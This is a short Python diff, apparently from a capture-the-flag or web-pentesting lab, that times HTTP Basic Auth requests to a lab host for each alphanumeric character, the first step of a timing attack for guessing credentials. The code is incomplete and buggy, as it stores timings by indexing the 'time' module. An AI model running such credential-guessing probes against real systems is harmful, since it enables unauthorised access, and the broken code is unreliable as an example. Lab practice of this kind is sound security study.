@@ -1,0 +1,16 @@
+from requests.auth import HTTPBasicAuth
+import requests
+import string
+import time
+
+
+alphaNumeric = "0123456789" + string.ascii_uppercase + string.ascii_lowercase
+
+for i in alphaNumeric:
+    t0 = time.time()
+    r = requests.get('http://wfp2.oregonctf.org/authentication/example2/',
+            auth=(i, ''))
+    t1 = time.time()
+
+    total = t1-t0
+    time[i] = total
